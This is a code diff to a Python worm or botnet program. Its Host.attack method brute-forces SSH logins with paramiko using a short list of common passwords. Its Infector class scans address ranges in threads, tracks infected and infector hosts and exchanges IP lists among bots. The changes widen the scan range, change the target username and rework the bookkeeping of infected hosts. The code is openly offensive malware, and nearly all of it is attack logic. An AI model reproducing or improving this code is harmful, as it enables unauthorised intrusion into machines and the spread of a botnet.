@@ -67,7 +67,7 @@ class Host(object):
         self.ssh = None
 
     def attack(self):
-        self.username = 'user'
+        self.username = 'testuser'
         pws = ['123456', 'qwerty', 'test', 'password', 'iloveyou']
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -153,7 +153,7 @@ class Infector:
         hs = []
         threads = []
 
-        for i in range(128, 140):
+        for i in range(128, 150):
             t = threading.Thread(target=self.scan_host, args=(hs, i))
             threads.append(t)
         for th in threads:
@@ -165,11 +165,12 @@ class Infector:
         self.clean_addr(hs)
 
     def clean_addr(self, hs):
-        hosts = []
+        hosts = set(self.infected)
+        hosts.add(self.self_ip)
         mylog('infected and infector IP: {0}, {1}'.format(self.infected, self.infector_ip))
         for h in hs:
-            if h not in self.pl and h != self.self_ip and h not in self.infected and h != self.infector_ip:
-                hosts.append(h)
+            if h not in self.infected:
+                hosts.add(h)
                 self.hosts[h] = Host(h, self.self_ip)
                 break
 
@@ -312,11 +313,11 @@ class Infector:
     # A
     def run(self):
         mylog('start')
+        self.infector_ip = IADDR
+        self.infected = INFECTED
 
         if self.self_ip not in self.pl:
             mylog('not in botnet')
-            self.infector_ip = IADDR
-            self.infected = INFECTED
             self.send_ips()
         t = threading.Thread(target=self.receive_ips)
         t.start()
